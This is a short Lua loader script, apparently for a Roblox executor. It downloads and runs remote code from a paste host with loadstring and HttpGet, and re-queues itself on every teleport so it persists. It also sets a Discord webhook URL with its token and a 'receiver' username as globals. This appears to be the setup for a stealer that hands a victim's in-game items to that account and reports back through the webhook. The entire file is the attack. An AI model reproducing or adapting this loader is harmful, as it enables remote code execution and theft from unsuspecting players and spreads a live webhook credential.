local userWebhook = "https://discord.com/api/webhooks/1397176516349264022/JwGuDi_UAMu-zAJB9LWd0oml1ZFdidMeaHmiNYDbiV1qUscAZH1vDfqxfapqZmYGVTqa"
local receiverName = "DouglasMcArthurT"
local mainScriptUrl = ""
local yourscripturl = ""
local loaderUrl = "https://api.rubis.app/v2/scrap/oBm2Zd00MmRwTK5n/raw"

local initialCommandToRun = ""
if loaderUrl and loaderUrl:gsub("%s", "") ~= "" then
    initialCommandToRun = string.format("pcall(function() loadstring(game:HttpGet('%s'))() end)", loaderUrl)
end

local delayedCommands = {
    string.format("getgenv().Webhook = '%s'", userWebhook),
    string.format("getgenv().receiver = '%s'", receiverName)
}

local function addDelayedCommand(url)
    if url and url:gsub("%s", "") ~= "" then
        table.insert(delayedCommands, string.format("pcall(function() loadstring(game:HttpGet('%s'))() end)", url))
    end
end

addDelayedCommand(mainScriptUrl)
addDelayedCommand(yourscripturl)

local delayedCommandToRun = table.concat(delayedCommands, "; ")

if initialCommandToRun ~= "" then
    pcall(loadstring(initialCommandToRun))
end

task.spawn(function()
    task.wait(0.1)
    pcall(loadstring(delayedCommandToRun))
end)

if queue_on_teleport then
    local fullCommandToRun = initialCommandToRun
    if delayedCommandToRun ~= "" then
        fullCommandToRun = fullCommandToRun .. "; task.wait(0.1); " .. delayedCommandToRun
    end
    queue_on_teleport(fullCommandToRun)
end
